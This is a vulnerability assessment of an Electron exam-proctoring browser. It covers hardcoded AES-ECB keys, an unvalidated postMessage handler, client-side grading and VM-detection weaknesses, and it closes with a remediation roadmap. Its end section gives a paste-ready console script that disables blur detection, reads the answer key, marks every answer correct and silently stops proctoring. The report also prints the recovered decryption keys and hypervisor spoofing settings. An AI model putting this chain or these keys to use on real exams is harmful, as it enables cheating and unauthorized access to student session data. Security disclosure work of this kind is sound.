# SRM Secure Browser — Security Assessment & Technical Vulnerability Analysis

**App:** SRMUG-Secure-Browser v1.0.22 by Eduswitch Solutions Pvt Ltd  
**Analyzed:** app.asar extracted (1,474 files, 336 directories, 25 Win32 EXEs)  
**Runtime Stack:** Electron 10.4.6, Chromium 85.0.4183.121, Node.js 12.16.3, V8 ~8.6  

---

## Technical Overview

The application is an Electron wrapper around a Chromium shell used to enforce an online examination lockdown. The exam environment runs inside a `<webview>` tag. Around that webview sits a security architecture consisting of:
- A preload script (`preload.js`) bridging IPC communications between the exam webview and the Electron main process.
- Multiple obfuscated and plaintext JavaScript renderers managing webcam/desktop capture, WebRTC video streaming, TensorFlow.js face/object detection (BlazeFace + COCO-SSD), and Firebase Realtime Database sync.
- A suite of Win32 native binaries spawned as child processes for keyboard hooking, process enumeration, user switching monitoring, and virtual machine detection.

---

## Vulnerability Analysis

### 1. Hardcoded AES-ECB Encryption Keys in Renderer Source

The application encrypts Firebase database configuration and WebRTC ICE server credentials in transit. However, the decryption logic in `chrome-tabs/renderer.js` relies on hardcoded symmetric keys stored directly in the obfuscated string table:

- `keysefghijkldesk` — Decrypts Firebase API keys and database configuration.
- `icesefghijklmnop` — Decrypts STUN/TURN ICE server credentials.

Both keys use **AES-128 in ECB mode**. ECB mode operates without an Initialization Vector (IV), rendering the cipher deterministic and leaking structural plaintext patterns. 

```javascript
// Recovered decryption routine from renderer.js
let key = CryptoJS.enc.Utf8.parse('keysefghijkldesk');
let decrypted = CryptoJS.AES.decrypt(responseText, key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7
});
var config = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8)).FirebaseKeys;
```

**Impact:** Extracting these static keys allows any client to initialize an unauthenticated Firebase instance and read or modify session records across the proctoring database.

---

### 2. Unvalidated postMessage Handler in Preload Script

In `preload.js` (lines 101–122), the application listens for cross-document window messages to handle lifecycle actions like starting or stopping proctoring streams. The event handler performs no verification on `event.origin`.

```javascript
window.addEventListener('message', function (event) {
    if (event.data.msg == "opentab" || event.data.Action == "opentab") {
        ipcRenderer.sendToHost('return-translation', { source: event.data.url });
    }
    else if (event.data.msg == "start" || event.data.Action == "start") {
        ipcRenderer.sendToHost('start-proctoring', event.data);
    }
    else if (event.data.msg == "stop" || event.data.Action == "stop") {
        ipcRenderer.sendToHost('stop-proctoring');
    }
    else if (event.data.msg == "actualstart" || event.data.Action == "actualstart") {
        ipcRenderer.sendToHost('actually-start');
    }
}, false);
```

**Impact:** Any script executing within the page context—including a reflected XSS on the exam portal or an embedded iframe—can dispatch `postMessage({ msg: "stop" }, "*")` to terminate webcam and desktop recording without generating errors or UI alerts. Functional PoC available in `poc/bypass-poc.js`.

---

### 3. Public Privileged Lifecycle Globals Attached to Window

`preload.js` (lines 6–15) exposes privileged IPC triggers directly to the exam page's global `window` context before page scripts load:

```javascript
window.StartTest = function (StudentInfoJSON) {
    ipcRenderer.sendToHost('start-proctoring', StudentInfoJSON);
}
window.EndTest = function () {
    ipcRenderer.sendToHost('stop-proctoring');
}
```

**Impact:** Any script running in the browser console or DOM context can call `window.EndTest()` to kill proctoring or call `window.StartTest(...)` with forged student metadata parameters.

---

### 4. Client-Side Answer Grading and Local Answer Key Exposure

The application loads the complete question set from the server at exam initialization and stores it in browser storage under `localStorage.getItem("ExamQuestionsObj")`. Crucially, each question object includes the `CorrectAns` field.

Evaluation occurs entirely client-side in `chrome-tabs/Renderer/renderer-Exam.js` (lines 300–313):

```javascript
var QuestionObj = QuestionsGlobal[currentQuestionNo];
if (selectedOpt) {
    let isAnswerCorrect;
    if (QuestionObj.CorrectAns == selectedOpt) {
        isAnswerCorrect = true;
    } else {
        isAnswerCorrect = false;
    }
    QuestionObj.selectedOpt = selectedOpt;
    QuestionObj.isAnswerCorrect = isAnswerCorrect;
}
```

When submitting, `renderer-Exam.js` (line 502) POSTs `ExamAnswersJSON` containing the client-calculated `isAnswerCorrect` boolean directly to `AssessmentConfig.UpdateExamAnswer`.

**Impact:** Students can read the full answer key from local storage prior to answering questions or programmatically set all `isAnswerCorrect` flags to true before submission. Functional PoC available in `poc/extract-answers.js`.

---

### 5. Production Debug Flags and Privileged Process Leaks

In `chrome-tabs/Renderer/renderer-Login.js` (line 149), window blur detection is gated by an exposed developer toggle:

```javascript
window.onblur = function () {
    if (DisableForegroundingFromMainForDebugging === false) {
        ipcRenderer.send('blur:application', true);
    }
}
```

Additionally, `preload.js` (lines 4, 59) retrieves active main-process task lists via `remote.getGlobal('ProcessesRunning')` and writes them directly into `localStorage.setItem("processesrunning", ...)`.

**Impact:** Setting `window.DisableForegroundingFromMainForDebugging = true` disables tab-switch and blur detection entirely. Exposing main-process process lists allows renderer scripts to inspect system auditing state.

---

### 6. Outdated Electron Runtime Carrying Unpatched Chromium CVEs

The application relies on `electron.remote`, which was deprecated in Electron 14 and removed in Electron 21. The runtime is pinned to **Electron 10.4.6** (Chromium 85.0.4183.121, Node.js 12.16.3).

**Impact:** The client carries unpatched Chromium vulnerabilities from 2020 through 2024 (including memory corruption and V8 execution bugs). Using `remote` allows compromised renderer contexts to directly access main-process Node.js primitives.

---

### 7. Direct Client-Writable Firebase Session State

The renderer writes operational telemetry directly to Firebase database paths without server-side validation rules. For example, in `renderer-Exam.js` (line 339):

```javascript
var questionCurrentIndexRef = firebase.database().ref('webrtc/students/' + studentFirebaseIdKeyGlobal + '/questionCurrentIndex');
questionCurrentIndexRef.set(currentQuestionNo);
```

**Impact:** If database rules permit client writes to student trees, an attacker can modify state nodes including `isOnline: false`, `AllowScreenRecord: false`, and `isExamEnded: false`, hiding their active session from proctor monitoring dashboards.

---

### 8. Easily Bypassable Native Virtual Machine Detection

`VMDetect.exe` (~15KB) is spawned as a child process to detect virtualized execution environments. It checks:
1. CPUID hypervisor bit (leaf 0x1, bit 31).
2. SMBIOS vendor strings ("VMware", "VirtualBox", "QEMU").
3. Presence of guest driver files on disk (`vboxguest.sys`, `vmhgfs.sys`).

**Impact:** All checks are easily defeated via hypervisor settings (e.g., setting `hypervisor.cpuid.v0 = "FALSE"` in VMware `.vmx` or spoofing SMBIOS vendor strings in VirtualBox). Furthermore, because `VMDetect.exe` sits in a user-writable path (`AppData\Local\Programs\SRM\resources\app.asar.unpacked\`), it can be replaced with a dummy binary returning `{"result": "ok", "status": 0}`. Functional C# stub available in `poc/fake-vmdetect.cs`.

---

### 9. Ineffective PrintScreen Hotkey Handling

`renderer-Login.js` (lines 116–119) listens for keyboard events matching `keyCode == 44` (PrintScreen) and overwrites the system clipboard with an empty string.

**Impact:** Standard screen capture utilities like Snipping Tool (`Win+Shift+S`), OBS Studio, ShareX, and external capture cards bypass this check entirely because they do not trigger `keyCode 44` or depend on clipboard data.

---

### 10. Deprecated Network Client and Unpinned API Endpoints

The application relies on the deprecated `request` module (`^2.87.0`) in `Main/main-GetAllExamKeys.js` to fetch configuration tokens. The HTTP requests do not implement certificate pinning or strict TLS verification checks.

**Impact:** Vulnerable to man-in-the-middle (MITM) inspection and response modification on local network segments.

---

### 11. Silent Geolocation Data Collection

Inside `renderer-WebRtc.js`, during WebRTC initialization, the client invokes `navigator.geolocation.getCurrentPosition()` and POSTs coordinates to `AssessmentConfig.SetStudentLocation` while updating Firebase user metadata.

**Impact:** Location telemetry is gathered and transmitted without explicit UI disclosure or permission prompts, as the Electron container grants geolocation access by default.

---

### 12. Leaked Auto-Updater Repository Configuration

The packaged bundle contains `app-update.yml`, exposing auto-updater metadata:
- **GitHub Owner:** `nevillekatila`
- **Target Staging Repo:** `github.com/nevillekatila/es-stage`
- **Cache Directory:** `srmug-secure-browser-updater` (Squirrel.Windows)

**Impact:** Discloses development infrastructure and staging release pipelines to external review.

---

### 13. Hardcoded Media Storage Upload Endpoints

Webcam and screen video recordings are captured in 30-second chunks using `MediaStreamRecorder` and posted to hardcoded Azure Blob Storage endpoints:
- `UploadStudentWebCamVideo`
- `UploadStudentDesktopVideo`

Failed requests append to a local offline retry queue (`formDataWebCamError`).

**Impact:** Allows an attacker to block or drop outgoing storage requests, suppressing video chunk delivery without interrupting the main examination socket connection.

---

## Chained Exploitation Vector (Full Integrity Bypass)

The combination of client-side answer storage, unvalidated IPC messaging, and exposed debug flags enables an end-to-end compromise executable within 60 seconds from any standard browser console:

```javascript
// 1. Disable tab-blur reporting
window.DisableForegroundingFromMainForDebugging = true;

// 2. Extract answer key from local storage
const exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
console.log("Answer Key:", exam.QuestionsJSON.map(q => q.CorrectAns));

// 3. Mutate all answers to correct
exam.QuestionsJSON.forEach(q => {
    q.selectedOpt = q.CorrectAns;
    q.isAnswerCorrect = true;
});
localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));

// 4. Kill proctoring recording feeds silently
window.postMessage({ msg: "stop" }, "*");

// 5. Submit exam — server receives all-correct score payload
```

---

## Vulnerability Summary Table

| # | Vulnerability Description | Severity | Target File / Component |
|---|---|---|---|
| 1 | Hardcoded AES-ECB keys in renderer | **Critical** | `chrome-tabs/renderer.js` |
| 2 | Unvalidated postMessage origin handler | **Critical** | `preload.js` |
| 3 | Public privileged lifecycle globals on window | **High** | `preload.js` |
| 4 | Client-side answer grading & key exposure | **Critical** | `renderer-Exam.js` |
| 5 | Production debug flags & process list leaks | **High** | `renderer-Login.js` / `preload.js` |
| 6 | Outdated Electron runtime (v10.4.6) with `remote` | **High** | `package.json` / `preload.js` |
| 7 | Direct client-writable Firebase session state | **High** | `renderer-Exam.js` / Firebase DB |
| 8 | Easily bypassable native VM detection | **Medium** | `VMDetect.exe` |
| 9 | Ineffective PrintScreen hotkey handling | **Low** | `renderer-Login.js` |
| 10 | Deprecated `request` module & unpinned APIs | **Medium** | `main-GetAllExamKeys.js` |
| 11 | Silent geolocation data collection | **Medium** | `renderer-WebRtc.js` |
| 12 | Leaked auto-updater repository metadata | **Low** | `app-update.yml` |
| 13 | Hardcoded media storage upload endpoints | **Medium** | `renderer.js` / Azure Blob |

---

## Remediation Roadmap

1. **Server-Side Verification:** Move answer validation, grading logic, and session state tracking exclusively to backend server endpoints. Never ship answer keys to the client.
2. **IPC & Origin Hardening:** Validate `event.origin` on all `window.addEventListener('message')` listeners and remove privileged lifecycle functions from the public `window` object.
3. **Runtime & Dependency Upgrades:** Upgrade Electron to a current, supported release, remove `electron.remote`, and replace deprecated dependencies like `request`.
4. **Binary & Storage Security:** Move application binaries to protected directories (`Program Files`) and enforce code signing / ASAR integrity checks at startup.
